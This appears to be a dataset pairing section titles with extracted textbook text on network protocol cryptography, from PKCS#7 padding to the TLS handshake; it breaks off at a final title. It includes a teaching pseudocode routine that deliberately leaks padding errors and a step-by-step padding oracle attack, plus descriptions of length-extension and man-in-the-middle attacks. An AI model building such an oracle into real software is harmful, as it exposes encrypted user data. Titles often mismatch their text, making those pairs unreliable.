    "output": "5 bytes of data 3 bytes of padding\n'H' 'e' 'l' 'l' 'o'\n0x03 0x03 0x03\n0x48 0x65 0x6C 0x6C 0x6F\n3 bytes of data 5 bytes of padding\n'A' 'B' 'C'\n0x05 0x05 0x05 0x05 0x05\n0x41 0x42 0x43\nFigure 7-7: Examples of PKCS#7 padding\nWhat if you don’t need padding? For instance, what if the last block\nyou’re encrypting is already the correct length? If you simply encrypt the\nlast block and transmit it, the decryption algorithm will interpret legiti-\nmate data as part of a padded block. To remove this ambiguity, the encryp-\ntion algorithm must send a final dummy block that only contains padding\nin order to signal to the decryption algorithm that the last block can be\ndiscarded.\nWhen the padded block is decrypted, the decryption process can eas-\nily verify the number of padding bytes present. The decryption process\nreads the last byte in the block to determine the expected number of\npadding bytes. For example, if the decryption process reads a value of 3,\nit knows that three bytes of padding should be present. The decryption\nprocess then reads the other two bytes of expected padding, verifying that\neach byte also has a value of 3. If padding is incorrect, either because all\nthe expected padding bytes are not the same value or the padding value\nis out of range (the value must be less than or equal to the size of a block\nand greater than 0), an error occurs that could cause the decryption pro-\ncess to fail. The manner of failure is a security consideration in itself.\nPadding Oracle Attack\nA serious security hole, known as the padding oracle attack, occurs when the\nCBC mode of operation is combined with the PKCS#7 padding scheme. The\nattack allows an attacker to decrypt data and in some cases encrypt their own\ndata (such as a session token) when sent via this protocol, even if they don’t\nknow the key. If an attacker can decrypt a session token, they might recover\nsensitive information. But if they can encrypt the token, they might be able to\ndo something like circumvent access controls on a website.\nFor example, consider Listing 7-1, which decrypts data from the net-\nwork using a private DES key.\n156 Chapter 7\ndef decrypt_session_token(byte key[])\n{\n byte iv[] = read_bytes(8);\nbyte token[] = read_to_end();\n bool error = des_cbc_decrypt(key, iv, token);\nif(error) {\n write_string(\"ERROR\");\n} else {\nx write_string(\"SUCCESS\");\n}\n}\nListing 7-1: A simple DES decryption from the network\nThe code reads the IV and the encrypted data from the network \nand passes it to a DES CBC decryption routine using an internal applica-\ntion key . In this case, it decrypts a client session token. This use case\nis common in web application frameworks, where the client is effectively\nstateless and must send a token with each request to verify its identity.\nThe decryption function returns an error condition that signals\nwhether the decryption failed. If so, it sends the string ERROR to the client ;\notherwise, it sends the string SUCCESS x. Consequently, this code provides an\nattacker with information about the success or failure of decrypting an arbi-\ntrary encrypted block from a client. In addition, if the code uses PKCS#7\nfor padding and an error occurs (because the padding doesn’t match the\ncorrect pattern in the last decrypted block), an attacker could use this\ninformation to perform the padding oracle attack and then decrypt the\nblock of data the attacker sent to a vulnerable service.\nThis is the essence of the padding oracle attack: by paying attention\nto whether the network service successfully decrypted the CBC-encrypted\nblock, the attacker can infer the block’s underlying unencrypted value.\n(The term oracle refers to the fact that the attacker can ask the service a\nquestion and receive a true or false answer. Specifically, in this case, the\nattacker can ask whether the padding for the encrypted block they sent to\nthe service is valid.)\nTo better understand how the padding oracle attack works, let’s return\nto how CBC decrypts a single block. Figure 7-8 shows the decryption of a\nblock of CBC-encrypted data. In this example, the plaintext is the string\nHello with three bytes of PKCS#7 padding after it.\nBy querying the web service, the attacker has direct control over the\noriginal cipher text and the IV. Because each plaintext byte is XORed with\nan IV byte during the final decryption step, the attacker can directly con-\ntrol the plaintext output by changing the corresponding byte in the IV. In\nthe example shown in Figure 7-8, the last byte of the decrypted block is\n0x2B, which gets XORed with the IV byte 0x28 and outputs 0x03, a pad-\nding byte. But if you change the last IV byte to 0xFF, the last byte of the\ncipher text decrypts to 0xD4, which is no longer a valid padding byte, and\nthe decryption service returns an error.\nNetwork Protocol Security 157"
  },
  {
    "input": "Stream Ciphers",
    "output": "Cipher text 0x1E 0x26 0x70 0x5F 0x2A 0x96 0x65 0x04\nDES decrypt\nDecrypted 0xE7 0x44 0xF2 0xC9 0x08 0x8B 0x0E 0x2B\n⊕ ⊕ ⊕ ⊕ ⊕ ⊕ ⊕ ⊕\nIV 0xAF 0x21 0x9E 0xA5 0x67 0x88 0x0D 0x28\n'H' 'e' 'l' 'l' 'o'\nPlaintext 0x03 0x03 0x03\n0x48 0x65 0x6C 0x6C 0x6F\nFigure 7-8: CBC decryption with IV\nNow the attacker has everything they need to figure out the padding\nvalue. They query the web service with dummy cipher texts, trying all pos-\nsible values for the last byte in the IV. Whenever the resulting decrypted\nvalue is not equal to 0x01 (or by chance another valid padding arrange-\nment), the decryption returns an error. But once padding is valid, the\ndecryption will return success.\nWith this information, the attacker can determine the value of that byte\nin the decrypted block, even though they don’t have the key. For example,\nsay the attacker sends the last IV byte as 0x2A. The decryption returns suc-\ncess, which means the decrypted byte XORed with 0x2A should equal 0x01.\nNow the attacker can calculate the decrypted value by XORing 0x2A with\n0x01, yielding 0x2B; if the attacker XORs this value with the original IV\nbyte (0x28), the result is 0x03, the original padding value, as expected.\nThe next step in the attack is to use the IV to generate a value of 0x02 in\nthe lowest two bytes of the plaintext. In the same manner that the attacker\nused brute force on the lowest byte earlier, now they can brute force the\nsecond-to-lowest byte. Next, because the attacker knows the value of the low-\nest byte, it’s possible to set it to 0x02 with the appropriate IV value. Then, they\ncan perform brute force on the second-to-lowest byte until the decryption is\nsuccessful, which means the second byte now equals 0x02 when decrypted. By\nrepeating this process until all bytes have been calculated, an attacker could\nuse this technique to decrypt any block.\nStream Ciphers\nUnlike block ciphers, which encrypt blocks of a message, stream ciphers\nwork at the individual bit level. The most common algorithm used for\n158 Chapter 7"
  },
  {
    "input": "Asymmetric Key Cryptography",
    "output": "stream ciphers generates a pseudorandom stream of bits, called the key stream,\nfrom an initial key. This key stream is then arithmetically applied to the mes-\nsage, typically using the XOR operation, to produce the cipher text, as shown\nin Figure 7-9.\n'H' 'e' 'l' 'l' 'o'\nPlaintext\n0x48 0x65 0x6C 0x6C 0x6F\n⊕ ⊕ ⊕ ⊕ ⊕ XOR operation\nKey stream 0x82 0xCC 0x19 0xa2 0xF1\nCipher text 0xCA 0xA9 0x75 0xCE 0x9E\nFigure 7-9: A stream cipher operation\nAs long as the arithmetic operation is reversible, all it takes to decrypt\nthe message is to generate the same key stream used for encryption and\nperform the reverse arithmetic operation on the cipher text. (In the case of\nXOR, the reverse operation is actually XOR.) The key stream can be gen-\nerated using a completely custom algorithm, such as in RC4, or by using a\nblock cipher and an accompanying mode of operation.\nTable 7-3 lists some common algorithms that you might find in real-\nworld applications.\nTable 7-3: Common Stream Ciphers\nCipher name Key size (bits) Year introduced\nA5/1 and A5/2 (used in 54 or 64 1989\nGSM voice encryption)\nRC4 Up to 2048 1993\nCounter mode (CTR) Dependent on block cipher N/A\nOutput Feedback mode (OFB) Dependent on block cipher N/A\nCipher Feedback mode (CFB) Dependent on block cipher N/A\nasymmetric key cryptography\nSymmetric key cryptography strikes a good balance between security and\nconvenience, but it has a significant problem: participants in the network\nneed to physically exchange secret keys. This is tough to do when the net-\nwork spans multiple geographical regions. Fortunately, asymmetric key cryp-\ntography (commonly called public key encryption) can mitigate this issue.\nNetwork Protocol Security 159"
  },
  {
    "input": "RSA Algorithm",
    "output": "An asymmetric algorithm requires two types of keys: public and private.\nThe public key encrypts a message, and the private key decrypts it. Because\nthe public key cannot decrypt a message, it can be given to anyone, even\nover a public network, without fear of its being captured by an attacker and\nused to decrypt traffic, as shown in Figure 7-10.\nPlaintext Cipher text\nEncrypt Decrypt\nPublic key Private key\nCipher text Plaintext\nFigure 7-10: Asymmetric key encryption and decryption\nAlthough the public and private keys are related mathematically, asym-\nmetric key algorithms are designed to make retrieving a private key from\na public key very time consuming; they’re built upon mathematical primi-\ntives known as trapdoor functions. (The name is derived from the concept\nthat it’s easy to go through a trapdoor, but if it shuts behind you, it’s dif-\nficult to go back.) These algorithms rely on the assumption that there is no\nworkaround for the time-intensive nature of the underlying mathematics.\nHowever, future advances in mathematics or computing power might dis-\nprove such assumptions.\nRSA Algorithm\nSurprisingly, not many unique asymmetric key algorithms are in common\nuse, especially compared to symmetric ones. The RSA algorithm is currently\nthe most widely used to secure network traffic and will be for the foreseeable\nfuture. Although newer algorithms are based on mathematical constructs\ncalled elliptic curves, they share many general principles with RSA.\nThe RSA algorithm, first published in 1977, is named after its original\ndevelopers—Ron Rivest, Adi Shamir, and Leonard Adleman. Its security\nrelies on the assumption that it’s difficult to factor large integers that are\nthe product of two prime numbers.\n160 Chapter 7\nFigure 7-11 shows the RSA encryption and decryption process. To gener-\nate a new key pair using RSA, you generate two large, random prime num-\nbers, p and q, and then choose a public exponent (e). (It’s common to use the\nvalue 65537, because it has mathematical properties that help ensure the\nsecurity of the algorithm.) You must also calculate two other numbers: the\nmodulus (n), which is the product of p and q, and a private exponent (d), which\nis used for decryption. (The process to generate d is rather complicated and\nbeyond the scope of this book.) The public exponent combined with the\nmodulus constitutes the public key, and the private exponent and modulus\nform the private key.\nFor the private key to remain private, the private exponent must be\nkept secret. And because the private exponent is generated from the origi-\nnal primes, p and q, these two numbers must also be kept secret.\n'H' 'e' 'l' 'l' 'o'\nPlaintext Cipher text (c) 0xAABBCCDDEE . . .\n0x48 0x65 0x6C 0x6C 0x6F\nMessage (m) 0x48656C6C6F Decrypt\ncd mod n\nEncrypt\nme mod n Message (m) 0x48656C6C6F\n'H' 'e' 'l' 'l' 'o'\nCipher text (c) 0xAABBCCDDEE . . . Plaintext\n0x48 0x65 0x6C 0x6C 0x6F\nFigure 7-11: A simple example of RSA encryption and decryption\nThe first step in the encryption process is to convert the message to an\ninteger, typically by assuming the bytes of the message actually represent a\nvariable-length integer. This integer, m, is raised to the power of the public\nexponent. The modulo operation, using the value of the public modulus n, is\nthen applied to the raised integer me. The resulting cipher text is now a value\nbetween zero and n. (So if you have a 1024-bit key, you can only ever encrypt\na maximum of 1024 bits in a message.) To decrypt the message, you apply the\nsame process, substituting the public exponent for the private one.\nNetwork Protocol Security 161"
  },
  {
    "input": "Diffie–Hellman Key Exchange",
    "output": "RSA is very computationally expensive to perform, especially relative\nto symmetric ciphers like AES. To mitigate this expense, very few applica-\ntions use RSA directly to encrypt a message. Instead, they generate a ran-\ndom session key and use this key to encrypt the message with a symmetric\ncipher, such as AES. Then, when the application wants to send a message to\nanother participant on the network, it encrypts only the session key using\nRSA and sends the RSA-encrypted key along with the AES-encrypted mes-\nsage. The recipient decrypts the message first by decrypting the session key,\nand then uses the session key to decrypt the actual message. Combining\nRSA with a symmetric cipher like AES provides the best of both worlds: fast\nencryption with public key security.\nRSA Padding\nOne weakness of this basic RSA algorithm is that it is deterministic: if you\nencrypt the same message multiple times using the same public key, RSA\nwill always produce the same encrypted result. This allows an attacker to\nmount what is known as a chosen plaintext attack in which the attacker has\naccess to the public key and can therefore encrypt any message. In the most\nbasic version of this attack, the attacker simply guesses the plaintext of an\nencrypted message. They continue encrypting their guesses using the pub-\nlic key, and if any of the encrypted guesses match the value of the original\nencrypted message, they know they’ve successfully guessed the target plain-\ntext, meaning they’ve effectively decrypted the message without private key\naccess.\nTo counter chosen plaintext attacks, RSA uses a form of padding dur-\ning the encryption process that ensures the encrypted output is nonde-\nterministic. (This “padding” is different from the block cipher padding\ndiscussed earlier. There, padding fills the plaintext to the next block\nboundary so the encryption algorithm has a full block to work with.)\nTwo padding schemes are commonly used with RSA: one is specified in\nthe Public Key Cryptography Standard #1.5; the other is called Optimal\nAsymmetric Encryption Padding (OAEP). OAEP is recommended for all new\napplications, but both schemes provide enough security for typical use\ncases. Be aware that not using padding with RSA is a serious security\nvulnerability.\nDiffie–Hellman Key Exchange\nRSA isn’t the only technique used to exchange keys between network partic-\nipants. Several algorithms are dedicated to that purpose; foremost among\nthem is the Diffie–Hellman Key Exchange (DH) algorithm.\nThe DH algorithm was developed by Whitfield Diffie and Martin\nHellman in 1976 and, like RSA, is built upon the mathematical primi-\ntives of exponentiation and modular arithmetic. DH allows two partici-\npants in a network to exchange keys and prevents anyone monitoring\nthe network from being able to determine what that key is. Figure 7-12\nshows the operation of the algorithm.\n162 Chapter 7\nClient Server\nDetermine\nGroup\ngroup Send group parameter\nparameter\nparameter\nGenerate Generate\nprivate key A private key B\nPublic network\nCalculate Calculate\npublic key public key\nfrom group from group\nand private and private\nkey A key B\nCombine Send public key Combine\npublic key B public key A\nand private and private\nkey A key B\nShared key generated\nFigure 7-12: The Diffie–Hellman Key Exchange algorithm\nThe participant initiating the exchange determines a parameter, which\nis a large prime number, and sends it to the other participant: the chosen\nvalue is not a secret and can be sent in the clear. Then each participant\ngenerates their own private key value—usually using a cryptographically\nsecure random number generator—and computes a public key using this\nprivate key and a selected group parameter that is requested by the client.\nThe public keys can safely be sent between the participants without the risk\nof revealing the private keys. Finally, each participant calculates a shared key\nby combining the other’s public key with their own private key. Both partici-\npants now have the shared key without ever having directly exchanged it.\nDH isn’t perfect. For example, this basic version of the algorithm can’t\nhandle an attacker performing a man-in-the-middle attack against the key-\nexchange. The attacker can impersonate the server on the network and\nexchange one key with the client. Next, the attacker exchanges a different\nNetwork Protocol Security 163"
  },
  {
    "input": "Cryptographic Hashing Algorithms",
    "output": "key with the server, resulting in the attacker now having two separate keys\nfor the connection. Then the attacker can decrypt data from the client and\nforward it on to the server, and vice versa.\nsignature algorithms\nEncrypting a message prevents attackers from viewing the information\nbeing sent over the network, but it doesn’t identify who sent it. Just because\nsomeone has the encryption key doesn’t mean they are who they say they are.\nWith asymmetric encryption, you don’t even need to manually exchange\nthe key ahead of time, so anyone can encrypt data with your public key and\nsend it to you.\nSignature algorithms solve this problem by generating a unique signature for\na message. The message recipient can use the same algorithm used to gener-\nate the signature to prove the message came from the signer. As an added\nadvantage, adding a signature to a message protects it against tampering if\nit’s being transmitted over an untrusted network. This is important, because\nencrypting data does not provide any guarantee of data integrity; that is, an\nencrypted message can still be modified by an attacker with knowledge of the\nunderlying network protocol.\nAll signature algorithms are built upon cryptographic hashing algorithms.\nFirst, I’ll describe hashing in more detail, and then I’ll explain some of the\nmost common signature algorithms.\nCryptographic Hashing Algorithms\nCryptographic hashing algorithms are functions that are applied to a mes-\nsage to generate a fixed-length summary of that message, which is usually\nmuch shorter than the original message. These algorithms are also called\nmessage digest algorithms. The purpose of hashing in signature algorithms is to\ngenerate a relatively unique value to verify the integrity of a message and to\nreduce the amount of data that needs to be signed and verified.\nFor a hashing algorithm to be suitable for cryptographic purposes, it\nhas to fulfill three requirements:\nPre-image resistance Given a hash value, it should be difficult (such\nas by requiring a massive amount of computing power) to recover a\nmessage.\nCollision resistance It should be difficult to find two different mes-\nsages that hash to the same value.\nNonlinearity It should be difficult to create a message that hashes to\nany given value.\nA number of hashing algorithms are available, but the most common\nare members of either the Message Digest (MD) or Secure Hashing Algorithm\n(SHA) families. The Message Digest family includes the MD4 and MD5\n164 Chapter 7"
  },
  {
    "input": "Asymmetric Signature Algorithms",
    "output": "algorithms, which were developed by Ron Rivest. The SHA family, which\ncontains the SHA-1 and SHA-2 algorithms, among others, is published\nby NIST.\nOther simple hashing algorithms, such as checksums and cyclic redun-\ndancy checks (CRC), are useful for detecting changes in a set of data; how-\never, they are not very useful for secure protocols. An attacker can easily\nchange the checksum, as the linear behavior of these algorithms makes it\ntrivial to determine how the checksum changes, and this modification of\nthe data is protected so the target has no knowledge of the change.\nAsymmetric Signature Algorithms\nAsymmetric signature algorithms use the properties of asymmetric cryptog-\nraphy to generate a message signature. Some algorithms, such as RSA, can\nbe used to provide the signature and the encryption, whereas others, such\nas the Digital Signature Algorithm (DSA), are designed for signatures only. In\nboth cases, the message to be signed is hashed, and a signature is generated\nfrom that hash.\nEarlier you saw how RSA can be used for encryption, but how can it be\nused to sign a message? The RSA signature algorithm relies on the fact that\nit’s possible to encrypt a message using the private key and decrypt it with\nthe public one. Although this “encryption” is no longer secure (the key to\ndecrypt the message is now public), it can be used to sign a message.\nFor example, the signer hashes the message and applies the RSA\ndecryption process to the hash using their private key; this encrypted\nhash is the signature. The recipient of the message can convert the signa-\nture using the signer’s public key to get the original hash value and com-\npare it against their own hash of the message. If the two hashes match, the\nsender must have used the correct private key to encrypt the hash; if the\nrecipient trusts that the only person with the private key is the signer, the\nsignature is verified. Figure 7-13 shows this process.\nMessage\nMessage hash Verify Message hash\nPrivate key Public key\nRSA RSA\nencrypt decrypt\nRSA signature\nFigure 7-13: RSA signature processing\nNetwork Protocol Security 165"
  },
  {
    "input": "Message Authentication Codes",
    "output": "Message Authentication Codes\nUnlike RSA, which is an asymmetric algorithm, Message Authentication Codes\n(MACs) are symmetric signature algorithms. As with symmetric encryption,\nsymmetric signature algorithms rely on sharing a key between the sender\nand recipient.\nFor example, say you want to send me a signed message and we both\nhave access to a shared key. First, you’d combine the message with the\nkey in some way. (I’ll discuss how to do this in more detail in a moment.)\nThen you’d hash the combination to produce a value that couldn’t easily\nbe reproduced without the original message and the shared key. When you\nsent me the message, you’d also send this hash as the signature. I could\nverify that the signature is valid by performing the same algorithm as you\ndid: I’d combine the key and message, hash the combination, and compare\nthe resulting value against the signature you sent. If the two values were the\nsame, I could be sure you’re the one who sent the message.\nHow would you combine the key and the message? You might be tempted\nto try something simple, such as just prefixing the message with the key and\nhashing to the combined result, as in Figure 7-14.\nInner padding block Message\nMD5\nMAC\nFigure 7-14: A simple MAC implementation\nBut with many common hashing algorithms (including MD5 and\nSHA-1), this would be a serious security mistake, because it opens a vul-\nnerability known as the length-extension attack. To understand why, you\nneed to know a bit about the construction of hashing algorithms.\nLength-Extension and Collision Attacks\nMany common hashing algorithms, including MD5 and SHA-1, consist of a\nblock structure. When hashing a message, the algorithm must first split the\nmessage into equal-sized blocks to process. (MD5, for example, uses a block\nsize of 64 bytes.)\nAs the hashing algorithm proceeds, the only state it maintains between\neach block is the hash value of the previous block. For the first block, the\nprevious hash value is a set of well-chosen constants. The well-chosen con-\nstants are specified as part of the algorithm and are generally important\nfor the secure operation. Figure 7-15 shows an example of how this works\nin MD5.\n166 Chapter 7\n0x67452301\n0xEFCDAB89\nInitial hash\n0x98BADCFE\n0x10325476\nMD5 Block 0\n0xAAAAAAAA\n0xBBBBBBBB\nHash 0\n0xCCCCCCCC\n0xDDDDDDDD\nMD5 Block 1 Message\n0xEEEEEEEE\n0xFFFFFFFF\nHash 1\n0xGGGGGGGG\n0xHHHHHHHH\nMD5 Block 2\n0xI I I I I I II\n0xJJJJJJJJ\nFinal hash\n0xKKKKKKKK\n0xLLLLLLLL\nFigure 7-15: The block structure of MD5\nNetwork Protocol Security 167\nIt’s important to note that the final output from the block-hashing pro-\ncess depends only on the previous block hash and the current block of the\nmessage. No permutation is applied to the final hash value. Therefore, it’s\npossible to extend the hash value by starting the algorithm at the last hash\ninstead of the predefined constants and then running through blocks of\ndata you want to add to the final hash.\nIn the case of a MAC in which the key has been prefixed at the start of\nthe message, this structure might allow an attacker to alter the message in\nsome way, such as by appending extra data to the end of an uploaded file.\nIf the attacker can append more blocks to the end of the message, they can\ncalculate the corresponding value of the MAC without knowing the key\nbecause the key has already been hashed into the state of the algorithm by\nthe time the attacker has control.\nWhat if you move the key to the end of the message rather than attach-\ning it to the front? Such an approach certainly prevents the length-extension\nattack, but there’s still a problem. Instead of an extension, the attacker needs\nto find a hash collision—that is, a message with the same hash value as the\nreal message being sent. Because many hashing algorithms (including MD5)\nare not collision resistant, the MAC may be open to this kind of collision\nattack. (One hashing algorithm that’s not vulnerable to this attack is SHA-3.)\nHashed Message Authentication Codes\nYou can use a Hashed Message Authentication Code (HMAC) to counter the\nattacks described in the previous section. Instead of directly appending the\nkey to the message and using the hashed output to produce a signature, an\nHMAC splits the process into two parts.\nFirst, the key is XORed with a padding block equal to the block size of\nthe hashing algorithm. This first padding block is filled with a repeating\nvalue, typically the byte 0x36. The combined result is the first key, some-\ntimes called the inner padding block. This is prefixed to the message, and\nthe hashing algorithm is applied. The second step takes the hash value\nfrom the first step, prefixes the hash with a new key (called the outer pad-\nding block, which typically uses the constant 0x5C), and applies the hash\nalgorithm again. The result is the final HMAC value. Figure 7-16 diagrams\nthis process.\nInner padding block Message\nMD5\nOuter padding block Intermediate hash\nMD5\nHMAC\nFigure 7-16: HMAC construction\n168 Chapter 7"
  },
  {
    "input": "X.509 Certificates",
    "output": "This construction is resistant to length-extension and collision attacks\nbecause the attacker can’t easily predict the final hash value without the key.\npublic key infrastructure\nHow do you verify the identity of the owner of a public key in public key\nencryption? Simply because a key is published with an associated identity—\nsay, Bob Smith from London—doesn’t mean it really comes from Bob Smith\nfrom London. For example, if I’ve managed to make you trust my public key\nas coming from Bob, anything you encrypt to him will be readable only by\nme, because I own the private key.\nTo mitigate this threat, you implement a Public Key Infrastructure (PKI),\nwhich refers to the combined set of protocols, encryption key formats, user\nroles, and policies used to manage asymmetric public key information across\na network. One model of PKI, the web of trust (WOT), is used by such applica-\ntions as Pretty Good Privacy (PGP). In the WOT model, the identity of a public\nkey is attested to by someone you trust, perhaps someone you’ve met in per-\nson. Unfortunately, although the WOT works well for email, where you’re\nlikely to know who you’re communicating with, it doesn’t work as well for\nautomated network applications and business processes.\nX.509 Certificates\nWhen a WOT won’t do, it’s common to use a more centralized trust model,\nsuch as X.509 certificates, which generate a strict hierarchy of trust rather\nthan rely on directly trusting peers. X.509 certificates are used to verify\nweb servers, sign executable programs, or authenticate to a network service.\nTrust is provided through a hierarchy of certificates using asymmetric sig-\nnature algorithms, such as RSA and DSA.\nTo complete this hierarchy, valid certificates must contain at least four\npieces of information:\n• The subject, which specifies the identity for the certificate\n• The subject’s public key\n• The issuer, which identifies the signing certificate\n• A valid signature applied over the certificate and authenticated by the\nissuer’s private key\nThese requirements create a hierarchy called a chain of trust between\ncertificates, as shown in Figure 7-17. One advantage to this model is that\nbecause only public key information is ever distributed, it’s possible to pro-\nvide component certificates to users via public networks.\nNetwork Protocol Security 169"
  },
  {
    "input": "Verifying a Certificate Chain",
    "output": "Issuer: SuperSignCA\nSubject: SuperSignCA\nRoot certificate\nSign Sign\nIssuer: SuperSignCA Issuer: SuperSignCA\nSubject: Badger Software Ltd Subject: www.badgers.com\nCode-signing certificate Web server certificate\nFigure 7-17: The X.509 certificate chain of trust\nNote that there is usually more than one level in the hierarchy, because\nit would be unusual for the root certificate issuer to directly sign certificates\nused by an application. The root certificate is issued by an entity called a\ncertificate authority (CA), which might be a public organization or company\n(such as Verisign) or a private entity that issues certificates for use on inter-\nnal networks. The CA’s job is to verify the identity of anyone it issues certifi-\ncates to.\nUnfortunately, the amount of actual checking that occurs is not always\nclear; often, CAs are more interested in selling signed certificates than in\ndoing their jobs, and some CAs do little more than check whether they’re\nissuing a certificate to a registered business address. Most diligent CAs should\nat least refuse to generate certificates for known companies, such as Microsoft\nor Google, when the certificate request doesn’t come from the company in\nquestion. By definition, the root certificate can’t be signed by another certifi-\ncate. Instead, the root certificate is a self-signed certificate where the private key\nassociated with the certificate’s public key is used to sign itself.\nVerifying a Certificate Chain\nTo verify a certificate, you follow the issuance chain back to the root cer-\ntificate, ensuring at each step that every certificate has a valid signature\nthat hasn’t expired. At this point, you decide whether you trust the root\ncertificate—and, by extension, the identity of the certificate at the end of\nthe chain. Most applications that handle certificates, like web browsers and\noperating systems, have a trusted root certificate database.\nWhat’s to stop someone who gets a web server certificate from sign-\ning their own fraudulent certificate using the web server’s private key? In\n170 Chapter 7\npractice, they can do just that. From a cryptography perspective, one pri-\nvate key is the same as any other. If you based the trust of a certificate on\nthe chain of keys, the fraudulent certificate would chain back to a trusted\nroot and appear to be valid.\nTo protect against this attack, the X.509 specification defines the\nbasic constraints parameter, which can be optionally added to a certificate.\nThis parameter is a flag that indicates the certificate can be used to sign\nanother certificate and thus act as a CA. If a certificate’s CA flag is set to\nfalse (or if the basic constraints parameter is missing), the verification of\nthe chain should fail if that certificate is ever used to sign another certifi-\ncate. Figure 7-18 shows this basic constraint parameter in a real certificate\nthat says this certificate should be valid to act as a certificate authority.\nBut what if a certificate issued for verifying a web server is used instead\nto sign application code? In this situation, the X.509 certificate can specify\na key usage parameter, which indicates what uses the certificate was gener-\nated for. If the certificate is ever used for something it was not designed to\ncertify, the verification chain should fail.\nFinally, what happens if the private key associated with a given certifi-\ncate is stolen or a CA accidentally issues a fraudulent certificate (as has hap-\npened a few times)? Even though each certificate has an expiration date, this\ndate might be many years in the future. Therefore, if a certificate needs to\nbe revoked, the CA can publish a certificate revocation list (CRL). If any certifi-\ncate in the chain is on the revocation list, the verification process should fail.\nFigure 7-18: X.509 certificate basic constraints\nNetwork Protocol Security 171"
  },
  {
    "input": "The TLS Handshake",
    "output": "As you can see, the certificate chain verification could potentially fail in\na number of places.\ncase study: transport layer security\nLet’s apply some of the theory behind protocol security and cryptog-\nraphy to a real-world protocol. Transport Layer Security (TLS), formerly\ncalled Secure Sockets Layer (SSL), is the most common security protocol in\nuse on the internet. TLS was originally developed as SSL by Netscape in\nthe mid-1990s for securing HTTP connections. The protocol has gone\nthrough multiple revisions: SSL versions 1.0 through 3.0 and TLS ver-\nsions 1.0 through 1.2. Although it was originally designed for HTTP, you\ncan use TLS for any TCP protocol. There’s even a variant, the Datagram\nTransport Layer Security (DTLS) protocol, to use with unreliable protocols,\nsuch as UDP.\nTLS uses many of the constructs described in this chapter, including\nsymmetric and asymmetric encryption, MACs, secure key exchange, and\nPKI. I’ll discuss the role each of these cryptographic tools plays in the secu-\nrity of a TLS connection and touch on some attacks against the protocol.\n(I’ll only discuss TLS version 1.0, because it’s the most commonly supported\nversion, but be aware that versions 1.1 and 1.2 are slowly becoming more\ncommon due to a number of security issues with version 1.0.)\nThe TLS Handshake\nThe most important part of establishing a new TLS connection is the hand-\nshake, where the client and server negotiate the type of encryption they’ll\nuse, exchange a unique key for the connection, and verify each other’s\nidentity. All communication uses a TLS Record protocol—a predefined tag-\nlength-value structure that allows the protocol parser to extract individual\nrecords from the stream of bytes. All handshake packets are assigned a tag\nvalue of 22 to distinguish them from other packets. Figure 7-19 shows the\nflow of these handshake packets in a simplified form. (Some packets are\noptional, as indicated in the figure.)\nAs you can see from all the data being sent back and forth, the hand-\nshake process can be time-intensive: sometimes it can be truncated or\nbypassed entirely by caching a previously negotiated session key or by the\nclient’s asking the server to resume a previous session by providing a unique\nsession identifier. This isn’t a security issue because, although a malicious\nclient could request the resumption of a session, the client still won’t know\nthe private negotiated session key.\n172 Chapter 7"
  },
  {
    "input": "Initial Negotiation",
    "output": "Client Server\nClient HELLO\nServer HELLO Required packets\nOptional packets\nServer certificate\nRequest client certificate\nServer HELLO Done\nClient certificate and verify\nClient key exchange\nChange cipher spec\nClient finished\nChange cipher specification\nEncrypted traffic\nFigure 7-19: The TLS handshake process\nInitial Negotiation\nAs the first step in the handshake, the client and server negotiate the secu-\nrity parameters they want to use for the TLS connection using a HELLO\nmessage. One of the pieces of information in a HELLO message is the client\nrandom, a random value that ensures the connection process cannot be eas-\nily replayed. The HELLO message also indicates what types of ciphers the\nclient supports. Although TLS is designed to be flexible with regard to what\nencryption algorithms it uses, it only supports symmetric ciphers, such as\nRC4 or AES, because using public key encryption would be too expensive\nfrom a computational perspective.\nThe server responds with its own HELLO message that indicates what\ncipher it has chosen from the available list provided by the client. (The\nconnection ends if the pair cannot negotiate a common cipher.) The\nserver HELLO message also contains the server random, another random\nvalue that adds additional replay protection to the connection. Next, the\nserver sends its X.509 certificate, as well as any necessary intermediate CA\ncertificates, so the client can make an informed decision about the iden-\ntity of the server. Then the server sends a HELLO Done packet to inform\nthe client it can proceed to authenticate the connection.\nNetwork Protocol Security 173"
  },
  {
    "input": "Endpoint Authentication",
    "output": "Endpoint Authentication\nThe client must verify that the server certificates are legitimate and that\nthey meet the client’s own security requirements. First, the client must ver-\nify the identity in the certificate by matching the certificate’s Subject field\nto the server’s domain name. For example, Figure 7-20 shows a certificate\nfor the domain www.domain.com. The Subject contains a Common Name\n(CN)  field that matches this domain.\n(cid:31)\nFigure 7-20: The Certificate Subject for www .domain .com\nA certificate’s Subject and Issuer fields are not simple strings but\nX.500 names, which contain other fields, such as the Organization (typi-\ncally the name of the company that owns the certificate) and Email (an\narbitrary email address). However, only the CN is ever checked during the\nhandshake to verify an identity, so don’t be confused by the extra data. It’s\nalso possible to have wildcards in the CN field, which is useful for shar-\ning certificates with multiple servers running on a subdomain name. For\nexample, a CN set to *.domain.com would match both www.domain.com and\nblog.domain.com.\nAfter the client has checked the identity of the endpoint (that is, the\nserver at the other end of the connection), it must ensure that the certifi-\ncate is trusted. It does so by building the chain of trust for the certificate\nand any intermediate CA certificates, checking to make sure none of the\ncertificates appear on any certificate revocation lists. If the root of the\n174 Chapter 7"
  },
  {
    "input": "Establishing Encryption",
    "output": "chain is not trusted by the client, it can assume the certificate is suspect\nand drop the connection to the server. Figure 7-21 shows a simple chain\nwith an intermediate CA for www.domain.com.\nFigure 7-21: The chain of trust for www .domain .com\nTLS also supports an optional client certificate that allows the server to\nauthenticate the client. If the server requests a client certificate, it sends a\nlist of acceptable root certificates to the client during its HELLO phase. The\nclient can then search its available certificates and choose the most appro-\npriate one to send back to the server. It sends the certificate—along with a\nverification message containing a hash of all the handshake messages sent\nand received up to this point—signed with the certificate’s private key. The\nserver can verify that the signature matches the key in the certificate and\ngrant the client access; however, if the match fails, the server can close the\nconnection. The signature proves to the server that the client possesses the\nprivate key associated with the certificate.\nEstablishing Encryption\nWhen the endpoint has been authenticated, the client and server can finally\nestablish an encrypted connection. To do so, the client sends a randomly\ngenerated pre-master secret to the server encrypted with the server’s certificate\npublic key. Next, both client and server combine the pre-master secret with\nthe client and server randoms, and they use this combined value to seed a\nrandom number generator that generates a 48-byte master secret, which will\nbe the session key for the encrypted connection. (The fact that both the\nNetwork Protocol Security 175"
  },
  {
    "input": "Meeting Security Requirements",
